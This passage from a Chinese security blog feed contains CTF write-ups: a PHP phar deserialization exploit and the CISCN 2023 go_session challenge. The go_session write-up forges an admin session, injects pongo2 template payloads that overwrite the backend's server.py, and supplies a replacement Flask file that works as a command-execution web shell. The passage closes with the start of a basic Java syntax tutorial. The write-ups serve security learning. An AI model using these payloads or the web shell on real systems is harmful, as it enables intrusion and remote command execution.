class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>)) &#123;</span><br><span class="line">    <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">detele</span>();</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">true</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/json&quot;</span>);</span><br><span class="line">    <span class="variable">$response</span> = <span class="keyword">array</span>(<span class="string">&quot;success&quot;</span> =&gt; <span class="literal">false</span>, <span class="string">&quot;error&quot;</span> =&gt; <span class="string">&quot;File not exist&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$response</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>download.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里有delete.php来触发file_exists然后触发反序列化,</p><p> 原因是在download中设置了open_basedir</p><blockquote><p><code>open_basedir</code> 是 PHP 的一个安全特性，用于限制 PHP 脚本对文件系统的访问范围。当 <code>open_basedir</code> 配置设置为某个目录时，PHP 脚本只能访问该目录及其子目录中的文件，而不能访问其他目录中的文件。</p></blockquote><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$db</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">File</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FileList</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$files</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line">        <span class="variable">$file</span>-&gt;filename = <span class="string">&quot;/flag.txt&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;files = <span class="keyword">array</span>(<span class="variable">$file</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;db = <span class="keyword">new</span> <span class="title class_">FileList</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;test.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;GIF86a&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240315155224020.png" alt="image-20240315155224020"></p><h2 id="CISCN-2023-初赛-go-session"><a href="#CISCN-2023-初赛-go-session" class="headerlink" title="[CISCN 2023 初赛]go_session"></a>[CISCN 2023 初赛]go_session</h2><p>第一次做go审计,先看源码</p><p>main.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;main/route&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">r := gin.Default()</span><br><span class="line">r.GET(<span class="string">&quot;/&quot;</span>, route.Index)</span><br><span class="line">r.GET(<span class="string">&quot;/admin&quot;</span>, route.Admin)</span><br><span class="line">r.GET(<span class="string">&quot;/flask&quot;</span>, route.Flask)</span><br><span class="line">r.Run(<span class="string">&quot;0.0.0.0:80&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>route.go</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> route</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;github.com/flosch/pongo2/v6&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gin-gonic/gin&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/gorilla/sessions&quot;</span></span><br><span class="line"><span class="string">&quot;html&quot;</span></span><br><span class="line"><span class="string">&quot;io&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> store = sessions.NewCookieStore([]<span class="type">byte</span>(os.Getenv(<span class="string">&quot;SESSION_KEY&quot;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Index</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;guest&quot;</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="string">&quot;Hello, guest&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Admin</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] != <span class="string">&quot;admin&quot;</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">name := c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;ssti&quot;</span>)</span><br><span class="line">xssWaf := html.EscapeString(name)</span><br><span class="line">tpl, err := pongo2.FromString(<span class="string">&quot;Hello &quot;</span> + xssWaf + <span class="string">&quot;!&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line">out, err := tpl.Execute(pongo2.Context&#123;<span class="string">&quot;c&quot;</span>: c&#125;)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">c.String(<span class="number">200</span>, out)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Flask</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">session, err := store.Get(c.Request, <span class="string">&quot;session-name&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, <span class="string">&quot;N0&quot;</span>, http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">resp, err := http.Get(<span class="string">&quot;http://127.0.0.1:5000/&quot;</span> + c.DefaultQuery(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;guest&quot;</span>))</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line">body, _ := io.ReadAll(resp.Body)</span><br><span class="line"></span><br><span class="line">c.String(<span class="number">200</span>, <span class="type">string</span>(body))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三条路由</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ : 设置一个guest的客户端session</span><br><span class="line">/admin : 鉴权是否为admin, 若是, 接受一个name参数, 并使用 Pongo2 模板引擎渲染参数值</span><br><span class="line">/flask : 访问内网的flask服务</span><br></pre></td></tr></table></figure><p>看了题解, 这里的os.Getenv(“SESSION_KEY”), </p><p>SESSION_KEY环境变量并没有设置, 导致可以伪造session</p><p>本地搭建了go环境, 直接把源码修改一下在本地运行, 让他返回一个admin的session</p><p>修改index路由, 返回admin的session而不是guest的</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> session.Values[<span class="string">&quot;name&quot;</span>] == <span class="literal">nil</span> &#123;</span><br><span class="line">session.Values[<span class="string">&quot;name&quot;</span>] = <span class="string">&quot;admin&quot;</span> <span class="comment">/////////修改为admin</span></span><br><span class="line">err = session.Save(c.Request, c.Writer)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">http.Error(c.Writer, err.Error(), http.StatusInternalServerError)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240314215648315.png" alt="image-20240314215648315"></p><p>拿这这个session去&#x2F;admin路由鉴权</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240314220545328.png" alt="image-20240314220545328"></p><p>可以看见模板字符串被渲染了, 存在ssti</p><p>再看后端flask</p><p>不传规定的参数name, 随便穿个参数让他报错出源码</p><p>GET &#x2F;flask?name&#x3D;?a&#x3D;1</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    <span class="keyword">return</span> name + <span class="string">&quot; no ssti&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__== <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>,port=<span class="number">5000</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>开启了debug, 也就意味着改变源码后服务器会立即更新, </p><p>这里就用到了SaveUploadedFile方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;c.SaveUploadedFile(c.FormFile(&quot;file&quot;),&quot;/app/server.py&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure><p>c.FormFile(“file”)返回表单数据中name为file的文件, SaveUploadedFile将该文件保存到”&#x2F;app&#x2F;server.py”</p><p>但是这里有一步html特殊字符的转义</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">html.EscapeString(name)</span><br></pre></td></tr></table></figure><p>所以payload中的引号会被转义掉</p><p>这里又引入了c.Request.Referer()或c.Request.UserAgent()方法, 顾名思义就是返回UA或者Referer的值(字符串)</p><p>还有一种方法是HandlerName() 方法，用于返回主处理程序的名称，这里返回的就是admin&#x2F;route.Admin，如何可以使用last过滤器获取最后一个字符n</p><p>两种payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;c.SaveUploadedFile(c.FormFile(c.Request.UserAgent()),c.Request.UserAgent())&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;c.SaveUploadedFile(c.FormFile(c.HandlerName()|last),c.Request.Referer())&#125;&#125;</span><br></pre></td></tr></table></figure><p>准备一个要替换上去的server.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    cmd = request.args[<span class="string">&#x27;name&#x27;</span>]</span><br><span class="line">    file=os.popen(cmd).read()</span><br><span class="line">    <span class="keyword">return</span> file</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>方便起见, 最直接用ApiPost7设置好http headers和请求参数, 上传的文件</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240315001841245.png" alt="image-20240315001841245"></p><p>之后访问flask,得到flag</p><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240315002025364.png" alt="image-20240315002025364"></p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/#go_session">https://exp10it.io/2023/05/2023-ciscn-%E5%88%9D%E8%B5%9B-web-writeup/#go_session</a></p><p><a href="https://blog.csdn.net/qq_62068476/article/details/132292872">https://blog.csdn.net/qq_62068476/article/details/132292872</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;CISCN2019-华北赛区-Day2-Web1-Hack-World&quot;&gt;&lt;a href=&quot;#CISCN2019-华北赛区-Day2-Web1-Hack-World&quot; class=&quot;headerlink&quot; title=&quot;[CISCN2019 华北赛区 Day2 W</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Java安全基础</title>
    <link href="http://example.com/2024/03/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2024/03/08/Java%E5%AE%89%E5%85%A8%E5%9F%BA%E7%A1%80/</id>
    <published>2024-03-08T12:29:02.000Z</published>
    <updated>2024-03-09T14:24:18.918Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Java基础语法"><a href="#Java基础语法" class="headerlink" title="Java基础语法"></a>Java基础语法</h1><h2 id="SOUT和SOUF输出"><a href="#SOUT和SOUF输出" class="headerlink" title="SOUT和SOUF输出"></a>SOUT和SOUF输出</h2><h3 id="SOUT"><a href="#SOUT" class="headerlink" title="SOUT"></a>SOUT</h3><p>不能使用格式化字符串, 但可以使用<code>+</code>拼接</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.print(<span class="string">&quot;hello,&quot;</span> + <span class="string">&quot;world!&quot;</span>);</span><br><span class="line">System.out.println(<span class="string">&quot;hello,&quot;</span> + <span class="string">&quot;world!&quot;</span>); <span class="comment">// 末尾自动补一个换行符</span></span><br></pre></td></tr></table></figure><h3 id="SOUF"><a href="#SOUF" class="headerlink" title="SOUF"></a>SOUF</h3><p>可以使用格式化字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">System.out.printf(<span class="string">&quot;hello,&quot;</span> + <span class="string">&quot;world and %s!&quot;</span>, <span class="string">&quot;you&quot;</span>);</span><br><span class="line"><span class="comment">//hello,world and you!</span></span><br></pre></td></tr></table></figure><h2 id="Scanner输入"><a href="#Scanner输入" class="headerlink" title="Scanner输入"></a>Scanner输入</h2><p><strong>两种输入方式<code>next()，nextline()</code></strong></p><h3 id="next"><a href="#next" class="headerlink" title="next()"></a>next()</h3><p>以空格为结束符</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.n4c1.www;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Scanner;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Scanner</span> <span class="variable">input</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(System.in);</span><br><span class="line">        System.out.println(<span class="string">&quot;Please input:&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(input.hasNext()) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> input.next();</span><br><span class="line">            System.out.printf(<span class="string">&quot;hello %s&quot;</span>, str);</span><br><span class="line">        &#125;</span><br><span class="line">        input.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/NaCl1/PicGo/main/image-20240308204606772.png" alt="image-20240308204606772"></p><h3 id="nextline"><a href="#nextline" class="headerlink" title="nextline()"></a>nextline()</h3><p>以回车为结束符</p><h2 id="for循环"><a href="#for循环" class="headerlink" title="for循环"></a>for循环</h2><p>与C语言完全相同</p><h2 id="增强for循环"><a href="#增强for循环" class="headerlink" title="增强for循环"></a>增强for循环</h2><p>自动遍历数组</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] numbers = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i : numbers) &#123;</span><br><span class="line">            System.out.println(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="类与继承"><a href="#类与继承" class="headerlink" title="类与继承"></a>类与继承</h2><p><strong>小知识</strong></p><blockquote><ul><li><strong>Public类：</strong> 